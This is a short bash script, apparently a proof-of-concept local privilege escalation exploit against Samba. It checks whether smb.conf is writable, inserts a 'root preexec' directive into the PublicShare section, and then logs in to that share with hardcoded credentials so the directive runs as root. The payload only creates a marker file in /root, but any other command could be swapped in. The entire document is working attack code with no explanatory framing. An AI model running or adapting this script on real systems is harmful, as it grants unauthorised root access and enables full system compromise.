#!/bin/bash

TARGET_FILE="/etc/samba/smb.conf"

if [ ! -w "$TARGET_FILE" ]; then
    exit 1
fi

sed -i '/\[PublicShare\]/a \   root preexec = touch /root/lpe_success.txt' "$TARGET_FILE"

smbclient //127.0.0.1/PublicShare -U vsftpd%password123 -c "ls" 2>/dev/null

exit 0
